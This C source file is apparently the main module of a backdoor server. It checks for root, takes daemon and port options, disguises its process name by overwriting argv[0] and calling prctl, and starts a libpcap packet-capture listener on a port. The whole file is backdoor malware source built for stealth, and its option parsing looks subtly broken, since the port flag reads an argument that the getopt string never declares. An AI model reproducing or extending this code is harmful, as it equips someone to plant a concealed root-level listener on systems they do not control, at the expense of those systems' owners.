#include "backdoor-server.h"

int main(int argc, char **argv)
{
	user_options.daemon_mode = FALSE;
	user_options.port = DEFAULT_PORT;

	/* Check to see if user is root */
	if (geteuid() != USER_ROOT)
	{
		printf("\nYou need to be root to run this.\n\n");
		exit(-1);
	}
	if(parse_options(argc, argv) < 0)
		exit(-1);

	print_server_info();

	mask_process(argv);

	start_server();

	return 0;
}

int start_server()
{
	pcap_t * nic_handle = NULL;
	struct bpf_program fp;

	startPacketCapture(nic_handle, fp, user_options.port);
	stopPacketCapture(nic_handle, fp);

	return 0;
}

int parse_options(int argc, char **argv)
{
	char c;
	while ((c = getopt (argc, argv, "dp")) != -1)
	{
		switch (c)
		{
			case 'd':
				user_options.daemon_mode = TRUE;
				break;
			case 'p':
				user_options.port = atoi(optarg);
				break;
			case '?':
			default:
				usage(argv[0], SERVER_MODE);
				return -1;
		}
	}
	return 0;
}

void mask_process(char **argv)
{
	memset(argv[0], 0, strlen(argv[0]));
	strcpy(argv[0], MASK_NAME);
	prctl(PR_SET_NAME, MASK_NAME, 0, 0);
}

void print_server_info()
{
	fprintf(stderr, "Daemon mode %s.\n", user_options.daemon_mode ? "enabled" : "disabled");
	fprintf(stderr, "Process name masked as: %s\n", MASK_NAME);
}
